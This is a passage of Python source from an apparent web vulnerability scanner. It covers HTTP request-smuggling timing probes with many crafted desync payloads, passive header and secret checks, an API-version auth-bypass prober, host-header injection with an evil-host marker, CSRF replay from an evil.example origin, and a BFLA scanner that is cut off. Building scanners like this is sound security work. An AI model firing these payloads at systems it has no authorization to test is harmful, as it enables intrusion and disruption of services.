                f"a downstream server likely honoured Content-Length and is still "
                f"waiting for the declared byte count (classic TE.CL smuggling signal)",
                sender.base.url, "endpoint"))
            return issues

        # ── Obfuscated Transfer-Encoding: some proxies normalise/strip a
        #    malformed TE value while the origin still treats it as chunked
        #    (or vice-versa) — same timing signal applies ──
        te_obf_body = "1\r\nA\r\n0\r\n\r\n"
        elapsed3, _ = self._raw_probe(scheme, host, port, path, {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "3",
            "Transfer-Encoding": "chunked\x00",
        }, te_obf_body, timeout=self._SOCKET_TIMEOUT)
        if elapsed3 >= threshold:
            issues.append(Issue("HIGH", f"{self.NAME} (Obfuscated TE Header)",
                "endpoint", r"Transfer-Encoding: chunked\x00 + Content-Length: 3",
                f"Response delayed {elapsed3:.1f}s with a malformed Transfer-Encoding "
                f"value — front-end and back-end likely disagree on whether to honour it",
                sender.base.url, "endpoint"))
            return issues

        # ── Extra desync variants — duplicate / obfuscated framing headers
        #    that real-world proxy↔origin pairs frequently disagree on. Each
        #    uses the exact same timing signal as the three probes above and
        #    only runs if none of them already fired (so an already-wedged
        #    backend never gets piled on with more probes than necessary).
        _extra_probes = [
            # CL.CL — two conflicting Content-Length values; whichever layer
            # honours the "wrong" one is left holding leftover/short bytes
            ("CL.CL Desync", "CRITICAL",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "6"),
              ("Content-Length", "4")],
             "1234567890",
             "Duplicate Content-Length headers: 6 and 4 (conflicting declared lengths)",
             "a downstream component honoured a different Content-Length value than "
             "the one the front-end used to forward the request — leftover bytes are "
             "then parsed as the start of the next request (classic CL.CL smuggling signal)"),

            # Space before the colon — many parsers reject this as an invalid
            # header name and silently fall back to Content-Length, while
            # others still treat it as a valid Transfer-Encoding
            ("TE.CL Desync (Space-before-colon TE)", "HIGH",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "6"),
              ("Transfer-Encoding ", "chunked")],
             "0\r\n\r\nX",
             "Header name 'Transfer-Encoding ' (trailing space before colon) + Content-Length: 6",
             "a downstream server normalised away the malformed header name and fell "
             "back to Content-Length while another component still honoured it as "
             "Transfer-Encoding — producing conflicting body framing"),

            # Tab character between header name and value
            ("TE.CL Desync (Tab-obfuscated TE)", "HIGH",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "6"),
              ("Transfer-Encoding", "\tchunked")],
             "0\r\n\r\nX",
             r"Transfer-Encoding: \tchunked (leading tab) + Content-Length: 6",
             "a leading tab before 'chunked' was tolerated by one component and "
             "rejected by another, leaving them disagreeing on how to frame the body"),

            # Duplicate Transfer-Encoding headers with conflicting values —
            # RFC says reject, but real parsers often just pick one
            ("TE.CL Desync (Duplicate Transfer-Encoding)", "HIGH",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "6"),
              ("Transfer-Encoding", "identity"),
              ("Transfer-Encoding", "chunked")],
             "0\r\n\r\nX",
             "Duplicate Transfer-Encoding headers: 'identity' then 'chunked' (conflicting values)",
             "a downstream server picked a different Transfer-Encoding value from the "
             "duplicated header than the front-end did, producing conflicting body framing"),

            # Chunk-extension syntax after the chunk size — some parsers strip
            # it, others choke on it or pass it straight through
            ("TE.CL Desync (Chunk-extension Abuse)", "HIGH",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "6"),
              ("Transfer-Encoding", "chunked")],
             "1;x=1\r\nA\r\nX",
             r"Chunk-extension '1;x=1' + Content-Length: 6 (conflicting framing)",
             "a downstream parser handled the chunk-extension syntax differently than "
             "the front-end, producing conflicting body framing from the front-end's "
             "perspective"),

            # ── 2025 NEW: OPTIONS + Body Desync (CVE-2025-54142) ──
            # Intermediaries assume OPTIONS has no body and forward immediately,
            # while the origin server reads Content-Length: 30 and waits for missing bytes.
            ("OPTIONS Method Body Desync (CVE-2025-54142)", "CRITICAL",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "30")],
             "X",
             "OPTIONS request with Content-Length: 30 + 1-byte body (declared 30 vs sent 1)",
             "a front-end proxy forwarded the OPTIONS request without body validation while a downstream server parsed Content-Length: 30 and waited for remaining bytes (CVE-2025-54142)",
             "OPTIONS", "HTTP/1.1"),

            # ── 2025 NEW: Terminating Chunk Extension Parameter Desync ──
            ("TE.CL Desync (Terminating Chunk Extension)", "HIGH",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "6"),
              ("Transfer-Encoding", "chunked")],
             "0;discard-this=junk\r\n\r\nX",
             r"Terminating chunk with parameter '0;discard-this=junk' + Content-Length: 6",
             "a downstream parser failed to recognize or normalize the chunk extension parameter on the 0-chunk and desynced with the front-end"),

            # ── 2025 NEW: Invalid Hex Chunk Boundary Discrepancy (CVE-2025-66373) ──
            ("TE.CL Desync (Invalid Chunk Size CVE-2025-66373)", "HIGH",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "6"),
              ("Transfer-Encoding", "chunked")],
             "abc;foo=bar\r\n0\r\n\r\nX",
             r"Chunk header 'abc;foo=bar' with premature termination + Content-Length: 6",
             "a downstream proxy and origin server disagreed on hex chunk length boundaries and extension handling (CVE-2025-66373)"),

            # ── HTTP/1.0 Protocol Downgrade Desync ──
            ("HTTP/1.0 Protocol Downgrade Desync", "MEDIUM",
             [("Content-Type", "application/x-www-form-urlencoded"),
              ("Content-Length", "6"),
              ("Connection", "keep-alive")],
             "1234567890",
             "HTTP/1.0 request line with Connection: keep-alive + conflicting Content-Length: 6",
             "an intermediary parsed the request as legacy HTTP/1.0 close while the downstream server maintained a persistent pipeline, causing request desynchronization",
             "POST", "HTTP/1.0"),
        ]

        for _entry in _extra_probes:
            _suffix = _entry[0]
            _sev = _entry[1]
            _hdrs = _entry[2]
            _body = _entry[3]
            _evidence = _entry[4]
            _why = _entry[5]
            _method = _entry[6] if len(_entry) > 6 else "POST"
            _proto = _entry[7] if len(_entry) > 7 else "HTTP/1.1"

            _el, _ = self._raw_probe(scheme, host, port, path, _hdrs, _body,
                                     timeout=self._SOCKET_TIMEOUT,
                                     method=_method, proto=_proto)
            if _el >= threshold:
                issues.append(Issue(_sev, f"{self.NAME} ({_suffix})",
                    "endpoint", _evidence,
                    f"Response delayed {_el:.1f}s vs baseline {base_elapsed:.1f}s — {_why}",
                    sender.base.url, "endpoint"))
                return issues   # connection/back-end may be wedged — don't pile on more probes

        # ── H2.CL Probe: HTTP/2 to HTTP/1.1 Downgrade (if target supports h2) ──
        if scheme == 'https':
            h2_elapsed, _ = self._h2_probe(scheme, host, port, path, timeout=self._SOCKET_TIMEOUT)
            if h2_elapsed >= threshold:
                issues.append(Issue("CRITICAL", f"{self.NAME} (H2.CL HTTP/2 Downgrade Desync)",
                    "endpoint",
                    "HTTP/2 POST with declared content-length: 4 + 1-byte DATA frame",
                    f"Response delayed {h2_elapsed:.1f}s over HTTP/2 — "
                    f"front-end likely negotiated HTTP/2 but downgraded to HTTP/1.1 to the backend "
                    f"without normalizing Content-Length, leaving the backend waiting (classic H2.CL signal)",
                    sender.base.url, "endpoint"))
                return issues

        return issues


# ─────────────────────────────────────────────────────────────────────────────
# PASSIVE CHECKER  (enhanced: subdomain takeover, more patterns)
# ─────────────────────────────────────────────────────────────────────────────
class PassiveChecker:
    SECURITY_HEADERS = {
        'X-Content-Type-Options':    'Missing X-Content-Type-Options (MIME sniffing)',
        'X-Frame-Options':           'Missing X-Frame-Options (Clickjacking)',
        'Content-Security-Policy':   'Missing Content-Security-Policy',
        'Strict-Transport-Security': 'Missing HSTS header',
        'X-XSS-Protection':          'Missing X-XSS-Protection',
        'Permissions-Policy':        'Missing Permissions-Policy',
    }
    SENSITIVE_PATTERNS = {
        r'BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY':   'Private key exposed',
        r'(?i)aws_secret_access_key':           'AWS secret key in response',
        r'(?i)mongodb\+srv://':                 'MongoDB connection string exposed',
    }
    # MODULE-15: Subdomain Takeover signatures
    TAKEOVER_PATS = {
        r"There isn't a GitHub Pages site here":      'GitHub Pages takeover possible',
        r'NoSuchBucket':                              'AWS S3 takeover possible',
        r'The specified bucket does not exist':       'AWS S3 takeover possible',
        r'Repository not found':                      'Bitbucket takeover possible',
        r'This shop is currently unavailable':        'Shopify takeover possible',
        r'fastly error: unknown domain':              'Fastly takeover possible',
        r'Heroku.*No such app':                       'Heroku takeover possible',
        r'The feed has not been found':               'Feedpress takeover possible',
        r'Sorry, this page is no longer available':   'Tumblr takeover possible',
    }

    def check(self, req: ScanRequest, resp) -> List[Issue]:
        issues = []
        if not resp: return issues
        h = resp.headers

        # Security headers
        for hdr, msg in self.SECURITY_HEADERS.items():
            if hdr not in h:
                issues.append(Issue("LOW", "Missing Security Header", hdr,
                                    "N/A", msg, req.url))

        # Server / tech disclosure
        # ── Server header ────────────────────────────────────────────────────
        # Any non-empty Server banner is a disclosure; version-bearing ones
        # (containing a digit, e.g. "nginx/1.18.0") are more severe because
        # they let attackers correlate the exact build against CVE databases.
        srv = h.get('Server', '')
        if srv:
            _has_ver = any(c.isdigit() for c in srv)
            issues.append(Issue(
                "LOW" if _has_ver else "INFO",
                "Server Version Disclosure" if _has_ver else "Server Name Disclosure",
                "Server", "N/A",
                f"Server: {srv}" + (
                    " — version number exposed, aids CVE targeting"
                    if _has_ver else
                    " — server software name exposed"
                ),
                req.url))

        # ── Server/tech name in response body (error pages, footers, etc.) ──
        # Frameworks and servers often embed their name in default error pages
        # (e.g. nginx's "<center>nginx</center>", Apache's <address> footer).
        # These disclosures survive even when the Server header is stripped.
        _SERVER_BODY_PATS = [
            # nginx / Apache / IIS / Tomcat / Jetty / LiteSpeed default error pages
            (r'<(?:address|center|h\d)[^>]*>[^<]*'
             r'(?:nginx|apache|tomcat|jetty|iis|openresty|lighttpd|litespeed|'
             r'caddy|werkzeug|gunicorn|puma|unicorn)[^<]*</(?:address|center|h\d)>',
             "Server name in HTML error page element"),
            # Title tags like "<title>501 Not Implemented — nginx</title>"
            (r'<title>[^<]*(?:nginx|apache|iis|tomcat|openresty|lighttpd)[^<]*</title>',
             "Server name in error page <title>"),
            # Generic "Powered by X" footer text
            (r'(?i)powered\s+by\s+(?:nginx|apache|php|tomcat|jetty|iis)',
             "Powered-by server disclosure in body"),
        ]
        for _spat, _swhat in _SERVER_BODY_PATS:
            if re.search(_spat, resp.text, re.I | re.S):
                issues.append(Issue("INFO", "Server Name Disclosed in Response Body",
                                    "response_body", "N/A",
                                    f"{_swhat} — remove server-identifying strings "
                                    f"from error pages / response templates",
                                    req.url))
                break   # one body-disclosure finding per response is enough

        powered = h.get('X-Powered-By', '')
        if powered:
            issues.append(Issue("INFO", "Technology Disclosure", "X-Powered-By",
                                "N/A", f"X-Powered-By: {powered}", req.url))

        # JWT in response body
        if re.search(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', resp.text):
            issues.append(Issue("INFO", "JWT Token in Response Body", "response_body",
                                "N/A", "JWT token found — verify it's intentional", req.url))

        # Stack trace exposure
        if re.search(
            r'(at\s+\w+\.\w+\(.*?\.java:\d+\)|Traceback.*?File|'
            r'Exception in thread|System\.Exception)',
            resp.text, re.DOTALL):
            issues.append(Issue("MEDIUM", "Stack Trace Exposed", "response_body",
                                "N/A", "Server stack trace visible", req.url))

        # Sensitive data
        for pat, desc in self.SENSITIVE_PATTERNS.items():
            if re.search(pat, resp.text):
                issues.append(Issue("HIGH", "Sensitive Data Exposure",
                                    "response_body", "N/A", desc, req.url))

        # MODULE-15: Subdomain takeover
        for pat, desc in self.TAKEOVER_PATS.items():
            if re.search(pat, resp.text, re.I):
                issues.append(Issue("HIGH", "Subdomain Takeover", "response_body",
                                    "N/A", desc, req.url))
                break

        # Debug / verbose error headers
        for dbg_hdr in ('X-Debug-Token', 'X-Debug-Info', 'X-Debug-Token-Link'):
            if dbg_hdr in h:
                issues.append(Issue("MEDIUM", "Debug Mode Enabled", dbg_hdr,
                                    "N/A", f"{dbg_hdr}: {h[dbg_hdr]}", req.url))

        return issues


# ─────────────────────────────────────────────────────────────────────────────
# API VERSION PROBE  (MODULE-21)
# ─────────────────────────────────────────────────────────────────────────────
class ApiVersionScanner:
    """Probe alternate API versions in the URL path.

    Detects version segments (/v1/, /v2/, /1.0/, /v2.1/ …) and sends
    requests to adjacent versions + the unversioned URL, then compares
    responses to find:
      • Deprecated versions still live (LOW)
      • Auth bypass via older version (CRITICAL / HIGH)
      • Unversioned endpoint exposed (MEDIUM)
    """
    KEY  = "api_version"
    NAME = "API Version Probe"

    # Matches /v2/, /v3.1/, /v10/  → groups (1='v', 2=numeric, 3=None)
    # OR      /1.0/, /2.1/          → groups (1=None, 2=None, 3=semver)
    _VER_RE = re.compile(r'/(v)(\d+(?:\.\d+)?)(?=/)|/(\d+\.\d+)(?=/)', re.I)

    # Named channel aliases — often lack auth/rate-limiting controls (HIGH value targets)
    # Each entry: (segment, description, base_severity_when_200)
    _NAMED = [
        ('internal',  'internal route',   'HIGH'),
        ('dev',       'dev environment',  'MEDIUM'),
        ('beta',      'beta channel',     'MEDIUM'),
        ('staging',   'staging env',      'MEDIUM'),
        ('alpha',     'alpha channel',    'LOW'),
        ('latest',    'latest alias',     'LOW'),
    ]

    # ── helpers ───────────────────────────────────────────────────────────────
    def _detect(self, path: str):
        """Return (match, ver_str, is_v_prefix) or None — first version segment only."""
        m = self._VER_RE.search(path)
        if not m:
            return None
        if m.group(1):                          # 'v'-prefix style
            return m, m.group(1) + m.group(2), True
        return m, m.group(3), False             # pure semver

    def _detect_all(self, path: str) -> List[tuple]:
        """Find ALL version segments in path (up to 2); each → (match, ver_str, is_v_prefix)."""
        results, pos = [], 0
        while pos < len(path) and len(results) < 2:
            m = self._VER_RE.search(path, pos)
            if not m:
                break
            if m.group(1):
                results.append((m, m.group(1) + m.group(2), True))
            else:
                results.append((m, m.group(3), False))
            pos = m.end()
        return results

    def _build_candidates(self, ver_str: str, is_v_prefix: bool,
                          include_named: bool = True) -> List[tuple]:
        """
        Return (new_ver, description, named_sev_or_None) triples to probe.
        named_sev_or_None is set only for named-channel variants (dev/beta/internal…).
        """
        cands: List[tuple] = []

        if is_v_prefix:
            num = ver_str[1:]               # strip leading 'v'
            if '.' in num:
                maj, _min = int(num.split('.')[0]), int(num.split('.')[1])
                if maj > 1:
                    cands += [(f'v{maj-1}',        f'older major v{maj-1}',        None),
                               (f'v{maj-1}.{_min}', f'older v{maj-1}.{_min}',       None)]
                cands += [
                    (f'v{maj+1}',       f'newer v{maj+1}',         None),
                    (f'v{maj+2}',       f'newer v{maj+2}',         None),
                    (f'{maj}.{_min}',   f'semver equiv {maj}.{_min}', None),
                    (f'{maj+1}.0',      f'next semver {maj+1}.0',  None),
                ]
            else:
                n = int(num)
                if n > 1:
                    cands.append((f'v{n-1}', f'older v{n-1}', None))
                    if n > 2:
                        cands.append((f'v{n-2}', f'older v{n-2}', None))
                cands += [
                    (f'v{n+1}',  f'newer v{n+1}',        None),
                    (f'v{n+2}',  f'two ahead v{n+2}',    None),
                    (f'{n}.0',   f'semver equiv {n}.0',  None),
                    (f'{n+1}.0', f'next semver {n+1}.0', None),
                ]
        else:
            maj, _min = int(ver_str.split('.')[0]), int(ver_str.split('.')[1])
            if maj > 1:
                cands += [(f'{maj-1}.{_min}', f'older {maj-1}.{_min}', None),
                           (f'{maj-1}.0',      f'older {maj-1}.0',      None)]
            cands += [
                (f'{maj}.{_min+1}',  f'minor bump {maj}.{_min+1}',  None),
                (f'{maj}.{_min+2}',  f'minor bump {maj}.{_min+2}',  None),
                (f'{maj+1}.0',       f'next major {maj+1}.0',        None),
                (f'{maj+2}.0',       f'two ahead {maj+2}.0',         None),
                (f'v{maj}',          f'v-prefix equiv v{maj}',       None),
                (f'v{maj+1}',        f'v-prefix next v{maj+1}',      None),
            ]

        if include_named:
            for seg, desc, sev in self._NAMED:
                cands.append((seg, desc, sev))

        return cands

    def _replace_ver(self, url: str, m: re.Match, new_ver: str) -> str:
        """Return url with the matched version string replaced by new_ver."""
        parsed = urllib.parse.urlparse(url)
        new_path = parsed.path[:m.start() + 1] + new_ver + parsed.path[m.end():]
        return urllib.parse.urlunparse(parsed._replace(path=new_path))

    def _remove_ver(self, url: str, m: re.Match) -> str:
        """Return url with the entire /ver/ segment collapsed to /."""
        parsed = urllib.parse.urlparse(url)
        new_path = parsed.path[:m.start()] + parsed.path[m.end():]
        return urllib.parse.urlunparse(parsed._replace(path=new_path))

    def _probe(self, sender: RequestSender, variant_url: str):
        """Replay the ORIGINAL request against the variant URL (same method,
        headers, cookies AND body) — only the version segment changes. Without
        replaying the body, a POST/PUT endpoint would reject the version probe
        (400/415 on an empty body) and the alternate version would look
        inaccessible even when it is not. Returns (status, len, text[:600])."""
        r = sender.send_raw(url=variant_url, body=sender.base.body)
        if r is None:
            return None, 0, ""
        return r.status_code, len(r.text), r.text[:600]

    def _bodies_differ(self, base_resp, vtext: str, vlen: int) -> bool:
        """True when variant body is meaningfully different from base response."""
        if not base_resp:
            return True
        base_len = len(base_resp.text)
        if base_len == 0 and vlen == 0:
            return False
        if abs(vlen - base_len) / max(base_len, 1) > 0.05:
            return True
        return base_resp.text[:200] != vtext[:200]

    # Error / auth-failure bodies that can come back WITH a 2xx status
    # (gateway-style APIs often wrap errors in HTTP 200). A version is only
    # "accessible" if the body is real data, not one of these.
    _ERR_BODY_RE = re.compile(
        r'invalid\s+credentials|access\s+failure|unauthor|forbidden|'
        r'not\s+found|no\s+such|does\s+not\s+exist|'
        r'"(?:code|errorCode|status)"\s*:\s*"?9\d{3,}|'
        r'internal\s+server\s+error|service\s+unavailable|bad\s+gateway|'
        r'<title>\s*\d{3}\b|"error"\s*:\s*(?:true|"[^"])',
        re.I)

    def _is_meaningful_body(self, status, text) -> bool:
        """True only when status is 2xx AND the body looks like real data
        (non-empty, not an error/auth-failure payload)."""
        if status is None or status not in range(200, 300):
            return False
        t = (text or "").strip()
        if len(t) < 2 or t in ("{}", "[]", "null", '""'):
            return False
        if self._ERR_BODY_RE.search(t[:600]):
            return False
        return True

    # ── scan() ────────────────────────────────────────────────────────────────
    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if point['type'] != 'endpoint':
            return []

        url    = sender.base.url
        parsed = urllib.parse.urlparse(url)

        # Detect ALL version segments (up to 2) — e.g. /hrcore/1.0/…/v2/…
        segs = self._detect_all(parsed.path)
        if not segs:
            return []

        base_status = base_resp.status_code if base_resp else 0
        issues: List[Issue]  = []
        probed_urls: set     = set()   # global dedup — avoids retesting same URL
                                       # when two segments produce identical variants

        for seg_idx, (m, ver_str, is_v_prefix) in enumerate(segs):
            tprint(f"    {Fore.CYAN}[api_version] segment '{ver_str}' in "
                   f"{parsed.path}{Style.RESET_ALL}")

            # Named-channel variants only on the first (most-significant) segment
            include_named = (seg_idx == 0)
            candidates = self._build_candidates(ver_str, is_v_prefix, include_named)

            # ── probe each candidate version ──────────────────────────────────
            for new_ver, desc, named_sev in candidates:
                variant_url = self._replace_ver(url, m, new_ver)
                if variant_url in probed_urls:
                    continue
                probed_urls.add(variant_url)

                vstatus, vlen, vtext = self._probe(sender, variant_url)

                # ── Status-based decision ─────────────────────────────────────
                #   • network error / 404 / 410  → version not there → NOT an issue
                #   • 2xx + real body            → version accessible → ISSUE
                #   • anything else (401/403/5xx/3xx, or 2xx with an error body)
                #                                → inconclusive → skip (false positive)
                if vstatus is None or vstatus in (404, 410):
                    continue
                if not self._is_meaningful_body(vstatus, vtext):
                    continue   # 2xx-with-error-body or non-2xx → don't report

                # From here: variant returned 2xx WITH a valid data body.

                # ① Auth bypass: base was locked (401/403) but this version opens
                if base_status in (401, 403):
                    sev_ab = "CRITICAL" if named_sev in (None, "HIGH", "MEDIUM") else "HIGH"
                    issues.append(Issue(
                        sev_ab, f"{self.NAME} — Auth Bypass via {new_ver}",
                        "url_path", new_ver,
                        f"{ver_str} → HTTP {base_status} (auth required); "
                        f"{new_ver} → HTTP {vstatus} with valid data — {desc} bypasses auth controls",
                        url, "endpoint",
                        response_snippet=vtext))
                    continue

                # ② Named channel (dev/beta/internal…) accessible with real data
                if named_sev:
                    issues.append(Issue(
                        named_sev, f"{self.NAME} — {new_ver.title()} Environment Accessible",
                        "url_path", new_ver,
                        f"Non-production channel '/{new_ver}/' returns HTTP {vstatus} "
                        f"with valid data ({desc}) — may lack production-grade auth/rate-limiting",
                        url, "endpoint",
                        response_snippet=vtext))
                    continue

                # ③ Another numeric/v-prefix version also serves real data
                sev  = "LOW"
                note = "different response content — deprecated API still live"
                if not self._bodies_differ(base_resp, vtext, vlen):
                    sev  = "INFO"
                    note = "same response content — likely intentional aliasing"
                issues.append(Issue(
                    sev, f"{self.NAME} — {new_ver} Accessible",
                    "url_path", new_ver,
                    f"{new_ver} returns HTTP {vstatus} with valid data ({note})",
                    url, "endpoint",
                    response_snippet=vtext))

            # ── probe unversioned URL (per segment) ───────────────────────────
            unver_url = self._remove_ver(url, m)
            if unver_url not in probed_urls:
                probed_urls.add(unver_url)
                uvstatus, _, uvtxt = self._probe(sender, unver_url)
                # Same rule: only a 2xx with a real data body counts.
                if uvstatus not in (404, 410) and self._is_meaningful_body(uvstatus, uvtxt):
                    if base_status in (401, 403):
                        issues.append(Issue(
                            "HIGH", f"{self.NAME} — Auth Bypass via Unversioned URL",
                            "url_path", "(version removed)",
                            f"{ver_str} → HTTP {base_status}; removing version → "
                            f"HTTP {uvstatus} with valid data — unversioned path bypasses auth controls",
                            url, "endpoint",
                            response_snippet=uvtxt))
                    else:
                        issues.append(Issue(
                            "MEDIUM", f"{self.NAME} — Unversioned Endpoint Accessible",
                            "url_path", "(version removed)",
                            f"Removing '{ver_str}' still returns HTTP {uvstatus} with valid data "
                            f"— unversioned path may lack version-specific controls",
                            url, "endpoint",
                            response_snippet=uvtxt))

        return issues


# ─────────────────────────────────────────────────────────────────────────────
# HOST HEADER INJECTION  (MODULE-22)
#   Spoofs Host / X-Forwarded-Host etc.; flags when the injected host is
#   reflected in a redirect Location (poisoning) or the response body
#   (web-cache / password-reset poisoning).  Endpoint-level.
# ─────────────────────────────────────────────────────────────────────────────
class HostHeaderScanner:
    KEY  = "hosthdr"
    NAME = "Host Header Injection"
    _VARIANTS = [
        ("Host",               lambda m: m),
        ("X-Forwarded-Host",   lambda m: m),
        ("X-Forwarded-Server", lambda m: m),
        ("X-Host",             lambda m: m),
        ("Forwarded",          lambda m: f"host={m}"),
    ]

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if point['type'] != 'endpoint':
            return []
        marker = f"evil{uuid.uuid4().hex[:8]}.example"
        issues: List[Issue] = []
        for hdr, build in self._VARIANTS:
            headers = sender.base.headers.copy()
            headers[hdr] = build(marker)
            r = sender.send_raw(headers=headers, allow_redirects=False)
            if not r:
                continue
            loc = r.headers.get('Location', '')
            if marker in loc:
                issues.append(Issue(
                    "HIGH", f"{self.NAME} — Redirect Poisoning",
                    hdr, marker,
                    f"Injected host reflected in Location header: {loc}",
                    sender.base.url, "header",
                    response_snippet=f"HTTP {r.status_code}\nLocation: {loc}",
                    confidence="Certain"))
                continue
            if marker in r.text:
                issues.append(Issue(
                    "MEDIUM", f"{self.NAME} — Host Reflected in Body",
                    hdr, marker,
                    "Injected host reflected in response body — enables web-cache "
                    "and password-reset poisoning",
                    sender.base.url, "header",
                    response_snippet=r.text[:CFG.SNIPPET_LEN],
                    confidence="Firm"))
        return issues


# ─────────────────────────────────────────────────────────────────────────────
# CSRF  (MODULE-23)
#   1) Cookie-less replay: if the same request still succeeds, it is not
#      cookie-bound → do not report CSRF.
#   2) Cross-origin replay (Origin/Referer=evil) with cookies kept: success
#      matching baseline confirms missing CSRF defense.
#   3) SameSite missing on Set-Cookie (passive, no extra request).
# ─────────────────────────────────────────────────────────────────────────────
class CSRFScanner:
    KEY  = "csrf"
    NAME = "CSRF"
    _TOKEN_RE = re.compile(r'csrf|xsrf|_token|authenticity_token|anti.?forgery|verification.?token', re.I)
    _STATE_CHANGING = {'POST', 'PUT', 'PATCH', 'DELETE'}
    _EVIL_ORIGIN = "https://evil.example"

    @staticmethod
    def _headers_without_cookie(headers: Dict[str, str]) -> Dict[str, str]:
        return {k: v for k, v in headers.items() if k.lower() != "cookie"}

    @staticmethod
    def _succeeded(r, base_resp) -> bool:
        if not r or not base_resp:
            return False
        if base_resp.status_code >= 400 or r.status_code >= 400:
            return False
        return r.status_code == base_resp.status_code

    def scan(self, sender: RequestSender, point: Dict, base_resp) -> List[Issue]:
        if point['type'] != 'endpoint':
            return []
        req = sender.base
        if req.method.upper() not in self._STATE_CHANGING:
            return []
        has_cookie = bool(req.cookies) or any(k.lower() == 'cookie' for k in req.headers)
        if not has_cookie:
            return []

        token_in_headers = any(self._TOKEN_RE.search(k) for k in req.headers)
        token_in_body    = bool(req.body and self._TOKEN_RE.search(req.body))
        token_in_query   = bool(self._TOKEN_RE.search(
            urllib.parse.urlparse(req.url).query or ''))

        issues: List[Issue] = []
        if not (token_in_headers or token_in_body or token_in_query):
            cookie_bound = True
            if base_resp is not None and base_resp.status_code < 400:
                r_nc = sender.send_raw(
                    headers=self._headers_without_cookie(req.headers),
                    cookies={},
                    body=req.body,
                    fresh_session=True,
                )
                if self._succeeded(r_nc, base_resp):
                    cookie_bound = False

            if cookie_bound:
                confirmed = False
                if base_resp is not None and base_resp.status_code < 400:
                    hx = req.headers.copy()
                    hx["Origin"] = self._EVIL_ORIGIN
                    hx["Referer"] = self._EVIL_ORIGIN + "/"
                    r_x = sender.send_raw(headers=hx, body=req.body)
                    confirmed = self._succeeded(r_x, base_resp)

                if confirmed:
                    issues.append(Issue(
                        "HIGH", f"{self.NAME} — Cross-Origin Request Accepted",
                        "Origin", self._EVIL_ORIGIN,
                        f"State-changing {req.method} with cookies accepted Origin "
                        f"{self._EVIL_ORIGIN} and no CSRF token — cookie-bound and "
                        f"cross-origin replay succeeded",
                        req.url, "endpoint", confidence="Firm"))
                else:
                    issues.append(Issue(
                        "MEDIUM", f"{self.NAME} — Missing Anti-CSRF Token",
                        "request", req.method,
                        f"State-changing {req.method} is cookie-bound and carries no "
                        f"CSRF token — cross-origin replay did not match baseline; "
                        f"confirm SameSite or server Origin checks",
                        req.url, "endpoint", confidence="Tentative"))

        if base_resp is not None:
            sc = base_resp.headers.get('Set-Cookie', '')
            if sc and 'samesite' not in sc.lower():
                issues.append(Issue(
                    "LOW", f"{self.NAME} — Cookie Without SameSite",
                    "Set-Cookie", "N/A",
                    "Session cookie set without a SameSite attribute — the browser "
                    "will attach it on cross-site requests",
                    req.url, "endpoint", confidence="Certain"))
        return issues


# ─────────────────────────────────────────────────────────────────────────────
# BFLA / METHOD OVERRIDE  (MODULE-24)
#   Same captured token — no second user. Path probes are GET-only so we do
#   not replay POST/DELETE onto /admin. Method-override only toward GET
#   (never DELETE/PUT) to avoid mutating the target.
#   FP control: 401/403/404 skip; HTML/login/error skip; body must differ
#   from baseline and look like real JSON/data.
# ─────────────────────────────────────────────────────────────────────────────
class AuthzScanner:
    KEY  = "authz"
    NAME = "Broken Function Level Authorization"
    MAX_ISSUES = 3
    _PRIV_SEGS = ("admin", "internal")
    _ALREADY_PRIV = re.compile(r'/(admin|internal|manage|console|staff)(/|$)', re.I)
    _ME_TAIL = re.compile(r'^(me|self|profile|current)$', re.I)
    _WRITE = {"POST", "PUT", "PATCH", "DELETE"}
    _ADMIN_KEYS = {
        "roles", "permissions", "privileges", "users", "tenants",
        "isadmin", "is_admin", "superuser", "audit", "members",
    }
    _ERR_BODY_RE = re.compile(
        r'invalid\s+credentials|access\s+failure|unauthor|forbidden|'
        r'not\s+found|no\s+such|does\s+not\s+exist|'
        r'please\s+log\s*in|sign\s*in\s*to|'
        r'internal\s+server\s+error|service\s+unavailable|'
        r'"error"\s*:\s*(?:true|"[^"]+")',
        re.I,
    )

    @staticmethod
    def _has_auth(req: ScanRequest) -> bool:
        if req.cookies:
            return True
        for k, v in (req.headers or {}).items():
            if not v:
                continue
            kl = k.lower()
            if kl == "cookie":
                return True
            if kl == "authorization":
                return True
            if kl in ("x-api-key", "api-key", "x-auth-token", "x-access-token"):
                return True
        return False

    @staticmethod
    def _json_keys(text: str) -> set:
        try:
            data = json.loads(text)
        except Exception:
            return set()
        if isinstance(data, dict):
            return set(data.keys())
        if isinstance(data, list) and data and isinstance(data[0], dict):
            return set(data[0].keys())
        return set()

    def _is_meaningful(self, r) -> bool:
        if not r or r.status_code not in range(200, 300):
            return False
        ct = (r.headers.get("Content-Type") or "").lower()
        if "html" in ct or "xml" in ct:
            return False
        t = (r.text or "").strip()
        if len(t) < 8 or t in ("{}", "[]", "null", '""', "true", "false"):
            return False
        if t[:1] == "<" or re.search(r'<html\b|<form\b', t[:800], re.I):
            return False
        if self._ERR_BODY_RE.search(t[:800]):
            return False
        return True

    def _too_similar(self, base_resp, r) -> bool:
        if not base_resp or not r:
            return False
        bt, nt = base_resp.text or "", r.text or ""
        if nt == bt:
            return True
        bl, nl = len(bt), len(nt)
        ratio = abs(nl - bl) / max(bl, 1)
        kb, kn = self._json_keys(bt), self._json_keys(nt)
        extra = {str(k).lower() for k in (kn - kb)}
        if extra and (extra & self._ADMIN_KEYS or any("admin" in k for k in extra)):
            return False
        if kb and kn and kb == kn and ratio < 0.15:
            return True
        if ratio < 0.08 and bt[:180] == nt[:180]:
            return True
        return False

    def _rebuild(self, parsed, parts: List[str]) -> str:
        path = "/" + "/".join(parts)
        if parsed.path.endswith("/") and not path.endswith("/"):
            path += "/"
        return urllib.parse.urlunparse(parsed._replace(path=path))

    def _bfla_urls(self, url: str) -> List[Tuple[str, str]]:
